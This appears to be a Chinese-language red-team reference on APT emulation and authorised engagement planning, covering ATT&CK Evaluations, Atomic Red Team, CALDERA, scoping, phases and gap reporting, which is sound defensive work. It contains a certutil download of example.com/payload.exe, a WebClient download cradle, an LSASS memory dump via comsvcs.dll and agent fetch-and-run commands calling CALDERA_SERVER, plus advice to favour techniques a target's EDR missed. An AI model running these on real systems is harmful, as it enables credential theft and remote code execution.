# APT 模拟框架与操作规划

---

## 1. MITRE ATT&CK Evaluations

### 1.1 方法论概述

```
ATT&CK Evaluations 流程:
├─ 选定 APT 组织 (如 APT29/Turla/Wizard Spider)
├─ 基于公开威胁情报构建攻击场景
│   ├─ 每个步骤映射到 ATT&CK technique
│   ├─ 使用该 APT 已知的工具和行为
│   └─ 模拟完整攻击链（从初始访问到目标达成）
├─ 在受评厂商的环境中执行攻击
├─ 记录每步操作的检测结果:
│   ├─ None: 未检测到
│   ├─ Telemetry: 有遥测数据但无告警
│   ├─ General: 检测到异常行为
│   ├─ Tactic: 识别到攻击战术
│   └─ Technique: 精确识别到攻击技术
└─ 公开发布结果（attack-evals.mitre-engenuity.org）
```

### 1.2 如何使用评估结果规划模拟

```
利用 ATT&CK Evaluations 规划红队行动:

步骤 1: 确认目标组织使用的安全产品
├─ EDR: CrowdStrike / Defender / SentinelOne / Carbon Black?
├─ SIEM: Splunk / Elastic / QRadar?
└─ Email Gateway / NDR 等

步骤 2: 查询该产品在评估中的表现
├─ 访问 attack-evals.mitre-engenuity.org
├─ 查看 Detection 标签页
├─ 关注 "None" 和 "Telemetry" 步骤 → 这些是检测盲区
└─ 对比不同 APT 评估轮次的结果

步骤 3: 基于盲区设计攻击计划
├─ 优先使用在评估中未被检测的 TTP
├─ 参考评估中使用的具体命令和工具
├─ 模拟同一 APT 的行为模式
└─ 预期哪些步骤会被检测 → 准备替代方案

示例:
如果目标使用 EDR-X，而 EDR-X 在 APT29 评估中:
├─ 未检测 T1055.012 (Process Hollowing) → 优先使用
├─ 检测了 T1003.001 (LSASS dump) → 使用替代方案
└─ Telemetry only on T1053.005 (Scheduled Task) → 可用但需谨慎
```

### 1.3 检测差距分析模板

```
基于评估结果的差距分析:

| ATT&CK Technique | 评估结果 | 目标环境测试 | 差距 | 优先级 |
|-------------------|---------|-------------|------|--------|
| T1566.001 Phishing | General | 未检测 | 邮件网关规则缺失 | P1 |
| T1059.001 PowerShell | Technique | 检测+告警 | 无差距 | - |
| T1055.012 Process Hollowing | None | 未检测 | EDR 缺少行为规则 | P1 |
| T1003.001 LSASS | Technique | 阻止 | 无差距 | - |
| T1021.006 WinRM | Telemetry | 遥测无告警 | 缺少关联规则 | P2 |
```

---

## 2. Atomic Red Team

### 2.1 使用方法

```bash
# 安装 (PowerShell)
Install-Module -Name AtomicRedTeam -Force
Install-Module -Name invoke-atomicredteam -Force

# 导入
Import-Module invoke-atomicredteam

# 列出可用的 Atomic Test
Invoke-AtomicTest T1059.001 -ShowDetails

# 执行特定技术的测试
Invoke-AtomicTest T1059.001 -TestNumbers 1,2,3

# 执行后检查检测
Invoke-AtomicTest T1059.001 -TestNumbers 1 -CheckPrereqs

# 清理（恢复原始状态）
Invoke-AtomicTest T1059.001 -TestNumbers 1 -Cleanup

# 批量执行指定 APT 的 TTP
$ttps = @("T1566.001","T1059.001","T1053.005","T1003.001","T1021.006")
foreach ($ttp in $ttps) {
    Invoke-AtomicTest $ttp -GetPrereqs
    Invoke-AtomicTest $ttp
    Start-Sleep -Seconds 300  # 间隔 5 分钟
}
```

```bash
# Linux 命令行使用 (atomics runner)
# 安装
git clone https://github.com/redcanaryco/atomic-red-team.git
cd atomic-red-team

# 查看特定技术的测试
cat atomics/T1059.001/T1059.001.yaml

# 使用 go-atomic (Go 版本 runner)
go-atomic run T1059.001
```

### 2.2 自定义 Atomic 编写

```yaml
# 自定义 Atomic Test 模板
# 文件: atomics/T1059.001/T1059.001.yaml (追加)
---
attack_technique: T1059.001
display_name: "PowerShell - Custom Download Cradle"
atomic_tests:

- name: "Custom PS Download via .NET WebClient"
  auto_generated_guid: custom-guid-here
  description: |
    模拟 APT29 使用 .NET WebClient 下载并执行 payload
  supported_platforms:
    - windows
  input_arguments:
    url:
      description: URL to download
      type: url
      default: https://raw.githubusercontent.com/test/test.ps1
  executor:
    command: |
      $wc = New-Object System.Net.WebClient
      $wc.Headers.Add("User-Agent","Mozilla/5.0")
      $data = $wc.DownloadString("#{url}")
    cleanup_command: |
      Remove-Item $env:TEMP\test.ps1 -Force -ErrorAction Ignore
    name: powershell
    elevation_required: false

- name: "Certutil Download - LOLBin"
  auto_generated_guid: custom-guid-here-2
  description: |
    使用 certutil 下载文件（绕过 PowerShell 检测）
  supported_platforms:
    - windows
  input_arguments:
    url:
      description: URL to download
      type: url
      default: https://example.com/payload.exe
    output:
      description: Output path
      type: path
      default: C:\Windows\Temp\cert.exe
  executor:
    command: |
      certutil -urlcache -split -f #{url} #{output}
    cleanup_command: |
      del #{output}
    name: command_prompt
    elevation_required: false
```

### 2.3 与 Detection Engineering 结合

```
Atomic Red Team + Detection Pipeline:

1. 执行 Atomic Test
   Invoke-AtomicTest T1055.012

2. 等待日志传输（1-5 分钟）

3. 在 SIEM 中验证检测
   # Splunk
   index=edr sourcetype=sysmon EventCode=8
   | search SourceImage="*\test_injection.exe"

4. 记录结果
   ├─ 检测到 → 规则有效，记录为 covered
   ├─ 遥测存在但无告警 → 需要编写检测规则
   └─ 无遥测 → 需要增加数据源（Sysmon Event/EDR 配置）

5. 编写/优化检测规则
   # 基于 Atomic Test 的行为编写 Sigma 规则

6. 重新测试验证

循环: Test → Detect → Fix → Re-test
```

---

## 3. MITRE CALDERA

### 3.1 自动化攻击模拟

```
CALDERA 架构:
├─ Server: Python，Web UI 管理
├─ Agent: 部署在目标主机
│   ├─ Sandcat (Go) — 跨平台默认 agent
│   ├─ Manx (Go) — 反向 shell agent
│   └─ Ragdoll (Python) — HTML 应用 agent
├─ Adversary Profile: 预定义的攻击序列
├─ Ability: 单个攻击动作（对应 ATT&CK technique）
└─ Operation: 一次完整的攻击模拟执行
```

```bash
# 安装
git clone https://github.com/mitre/caldera.git --recursive
cd caldera
pip3 install -r requirements.txt
python3 server.py --insecure

# 默认访问: http://localhost:8888
# 默认凭据: admin/admin 或 red/admin
```

### 3.2 Adversary Profile 配置

```yaml
# 自定义 Adversary Profile 示例 (APT29 模拟)
---
adversary:
  name: "APT29 Simulation"
  description: "模拟 APT29 攻击链"
  atomic_ordering:
    # Phase 1: Discovery
    - id: "discovery-whoami"
      tactic: "discovery"
      technique_id: "T1033"
      name: "System Owner/User Discovery"
      command: "whoami /all"
      platform: "windows"

    # Phase 2: Credential Access
    - id: "cred-mimikatz"
      tactic: "credential-access"
      technique_id: "T1003.001"
      name: "LSASS Memory Dump"
      command: "rundll32.exe comsvcs.dll,MiniDump (Get-Process lsass).Id dump.bin full"
      platform: "windows"
      privilege: "Elevated"

    # Phase 3: Lateral Movement
    - id: "lateral-winrm"
      tactic: "lateral-movement"
      technique_id: "T1021.006"
      name: "WinRM Execution"
      command: "Invoke-Command -ComputerName #{target} -ScriptBlock {whoami}"
      platform: "windows"
      privilege: "Elevated"
```

### 3.3 Agent 部署和操作

```bash
# Sandcat Agent 部署（目标主机）
# Windows
$url="http://CALDERA_SERVER:8888/file/download"
$wc=New-Object System.Net.WebClient
$data=$wc.DownloadData("$url")
[System.IO.File]::WriteAllBytes("C:\temp\sandcat.exe",$data)
Start-Process C:\temp\sandcat.exe -ArgumentList "-server http://CALDERA_SERVER:8888 -group red"

# Linux
curl -s http://CALDERA_SERVER:8888/file/download > /tmp/sandcat
chmod +x /tmp/sandcat
/tmp/sandcat -server http://CALDERA_SERVER:8888 -group red &

# 通过 Web UI 管理
# Operations → New Operation → 选择 Adversary Profile → 选择 Agent Group → Run
```

---

## 4. Prelude Operator

### 4.1 TTP 编排

```
Prelude Operator 特点:
├─ 商业工具（有社区版）
├─ 拖拽式 TTP 编排界面
├─ 自动化检测验证（执行攻击 + 检查检测状态）
├─ 支持多平台 Agent (Pneuma)
└─ 与 MITRE ATT&CK 紧密集成

使用流程:
1. 导入或创建 TTP Chain
2. 部署 Pneuma Agent 到目标
3. 执行 Chain → 自动按顺序执行每个 TTP
4. 检查每步的执行结果和检测状态
5. 生成报告
```

### 4.2 检测验证

```
自动化检测验证流程:
├─ 步骤 1: 在目标环境执行 TTP
├─ 步骤 2: 等待检测管道处理（可配置延迟）
├─ 步骤 3: 通过 API 查询 SIEM/EDR 是否产生告警
│   ├─ Splunk API → 搜索特定告警
│   ├─ Elastic API → 查询检测规则触发
│   └─ EDR API → 检查安全事件
├─ 步骤 4: 标记每个 TTP 的检测状态
│   ├─ Detected: 告警产生
│   ├─ Logged: 有日志但无告警
│   └─ Missed: 无日志也无告警
└─ 步骤 5: 输出覆盖率报告
```

---

## 5. 红队操作规划

### 5.1 Engagement Scope 定义

```
操作范围文档模板:

[项目名称] Red Team Assessment — Scope Document

授权方:
├─ 签署人: [CISO/CTO 姓名]
├─ 日期: [签署日期]
└─ 有效期: [开始日期] 至 [结束日期]

In-Scope:
├─ 网络范围: 10.0.0.0/8 (内网), DMZ, Cloud (AWS Account xxx)
├─ 系统: 所有 Windows/Linux 服务器, 域控制器
├─ 用户: 所有员工（社会工程授权）
├─ 应用: 内外网 Web 应用, 邮件系统
└─ 物理: [如适用] 办公区域

Out-of-Scope:
├─ ⛔ 生产数据库（只读测试，不修改数据）
├─ ⛔ SCADA/ICS 系统
├─ ⛔ 第三方托管系统（除非有单独授权）
├─ ⛔ DDoS / 拒绝服务攻击
└─ ⛔ 真实数据外传（使用标记数据）

紧急联系人:
├─ 蓝队联络人: [姓名/电话]
├─ 管理层联络人: [姓名/电话]
└─ 法务联络人: [姓名/电话]

停止条件:
├─ 发现真实入侵迹象 → 立即通知蓝队
├─ 业务影响（服务中断/数据损坏）→ 立即停止
├─ 蓝队要求暂停 → 协商后执行
└─ 超出时间窗口 → 清理并撤出
```

### 5.2 TTP 选择策略

```
基于威胁模型选择 TTP:

输入:
├─ 目标行业 → 确定相关 APT
├─ 目标安全栈 → 确定已知检测能力
├─ 评估目标 → 测试什么（检测? 响应? 恢复?）
└─ 时间预算 → 决定模拟深度

决策树:
目标是什么？
├─ 测试检测能力 → 使用已知 TTP，记录检测率
│   工具: Atomic Red Team, CALDERA
│   重点: 覆盖面广，每个 ATT&CK tactic 至少 2-3 个 technique
│
├─ 测试响应能力 → 使用会触发告警的 TTP，观察响应时间
│   工具: 手动红队 + 时间记录
│   重点: 从告警到遏制需要多长时间
│
├─ 模拟真实威胁 → 使用特定 APT 的完整攻击链
│   工具: 手动红队 + C2 框架
│   重点: 端到端模拟，测试防御体系整体有效性
│
└─ 合规验证 → 使用标准化测试（如 TIBER-EU 框架）
    工具: 框架规定的标准化流程
    重点: 满足监管要求
```

### 5.3 阶段性目标设计

```
Red Team 操作阶段:

Phase 0: 外部侦察（1-2 周）
├─ 目标: 收集攻击面信息
├─ 活动: OSINT, DNS 枚举, 端口扫描, 员工信息收集
├─ 里程碑: 完成外部攻击面报告
└─ OPSEC: 使用匿名基础设施，不触发目标告警

Phase 1: 初始访问（1-2 周）
├─ 目标: 在目标网络获得立足点
├─ 活动: 钓鱼/漏洞利用/凭据攻击
├─ 里程碑: 获得第一个 Beacon/Shell
└─ OPSEC: 使用 Staging 基础设施

Phase 2: 建立驻留（1 周）
├─ 目标: 持久化 + 切换到 Long-Haul 通道
├─ 活动: 持久化机制部署, C2 通道切换
├─ 里程碑: 稳定的持久访问
└─ OPSEC: 切换到 Long-Haul 基础设施

Phase 3: 内网操作（2-3 周）
├─ 目标: 域枚举 + 权限提升 + 横向移动
├─ 活动: AD 攻击, 凭据窃取, 横向到关键系统
├─ 里程碑: Domain Admin / 关键系统访问
└─ OPSEC: 低频操作, LOLBins, 时间分散

Phase 4: 目标达成（1 周）
├─ 目标: 完成评估目标（数据标记/关键系统控制）
├─ 活动: 数据收集, 模拟外传, 业务影响评估
├─ 里程碑: 完成所有评估目标
└─ OPSEC: 使用 Exfil 基础设施

Phase 5: 清理与报告（1 周）
├─ 目标: 移除所有植入, 恢复环境, 编写报告
├─ 活动: 清理持久化, 删除工具, 恢复配置
├─ 里程碑: 干净的环境 + 完整的报告
└─ 关键: 确保没有遗留任何后门
```

### 5.4 通信计划

```
红队与相关方的通信:

与管理层（每周/关键节点）:
├─ 简报内容: 高层进展，是否发现重大风险
├─ 格式: 简短邮件或 15 分钟电话
├─ 不包含: 技术细节，具体 TTP
└─ 关键时刻: 获得 DA / 发现真实入侵 / 业务影响

与蓝队（仅限紧急情况 — 如果是不通知蓝队的评估）:
├─ 发现真实入侵 → 立即通知
├─ 意外导致业务影响 → 立即通知
└─ 蓝队升级事件到管理层 → 协调是否暴露

与蓝队（紫队模式 — 如果是协作评估）:
├─ 每日同步: 今天执行了什么 TTP
├─ 检测讨论: 哪些被检测到，哪些没有
├─ 即时反馈: 蓝队优化规则 → 红队重新测试
└─ 共同文档: 实时更新检测覆盖矩阵
```

---

## 6. 评估报告

### 6.1 攻击路径图可视化

```
报告中应包含攻击路径图:

[钓鱼邮件] → [财务部 PC] → [凭据窃取]
                                    ↓
[Active Directory] ← [横向移动] ← [域枚举]
       ↓
[Domain Admin] → [DC 访问] → [数据库服务器]
                                    ↓
                              [数据标记外传]

工具:
├─ ATT&CK Navigator: attack.mitre.org/navigator/ → 热力图
├─ draw.io / Lucidchart: 攻击路径流程图
├─ PlantUML: 代码生成图表
├─ BloodHound: AD 攻击路径可视化
└─ Maltego: 基础设施关联图
```

### 6.2 TTP Coverage Matrix

```
ATT&CK Navigator 配置:

已测试且检测到:  绿色 (score: 1)
已测试但未检测:  红色 (score: 100)
已测试有遥测:    黄色 (score: 50)
未测试:          灰色 (score: 0)

导出为 JSON → 导入 ATT&CK Navigator
生成可视化热力图用于报告
```

### 6.3 Detection Gap 分析模板

```
检测差距分析报告:

1. 执行摘要
   - 共测试 XX 个 ATT&CK techniques
   - 检测率: XX% (被检测/总测试)
   - 阻止率: XX% (被阻止/总测试)
   - 关键差距: [列出 Top 5]

2. 差距详情
   | Technique | 描述 | 测试方法 | 检测状态 | 影响 | 修复建议 |
   |-----------|------|---------|---------|------|---------|
   | T1055.012 | Process Hollowing | 自定义 loader | 未检测 | 高 | 启用 Sysmon Event 25 |

3. 修复建议优先级
   P1 (立即): 影响高 + 修复简单
   ├─ 启用 PowerShell ScriptBlock Logging
   ├─ 部署 Sysmon 增强配置
   └─ 配置 LSASS 保护 (PPL)

   P2 (短期 1-3 月): 影响高 + 需要投入
   ├─ EDR 行为规则优化
   ├─ 网络检测规则（C2 通信模式）
   └─ 凭据保护 (Credential Guard)

   P3 (中期 3-6 月): 影响中 + 系统性改进
   ├─ 零信任架构推进
   ├─ 微分段网络隔离
   └─ 特权访问管理 (PAM)

4. 重新测试计划
   - P1 修复后 2 周内重新测试
   - P2 修复后 1 月内重新测试
   - 季度全面红队评估
```

---

## 关联参考

- **APT 模拟与情报驱动红队** → 本 skill 的 `SKILL.md`
- **检测规则分析与绕过** → 需要时使用 `threat-hunting-evasion` skill
- **红队评估** → 需要时使用 `red-team-assessment` skill
